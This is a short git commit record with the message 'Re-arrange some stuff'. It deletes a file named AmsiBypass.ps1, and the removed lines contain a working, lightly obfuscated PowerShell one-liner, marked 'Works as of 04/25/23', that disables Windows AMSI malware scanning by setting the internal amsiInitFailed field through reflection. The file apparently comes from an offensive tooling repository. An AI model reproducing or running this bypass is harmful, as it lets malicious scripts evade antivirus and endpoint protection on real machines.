4ced3a5c01ab0422281b90fb1ab98fe21cb62b55
Bryan McNulty <bryanmcnulty@protonmail.com>
2023-06-25 09:26:09 -0500

    Re-arrange some stuff

--- AmsiBypass.ps1
+++
@@ -1,2 +0,0 @@
-# Works as of 04/25/23
-$a,$b='si','Am';$r=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f$b,$a));$z=$r.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
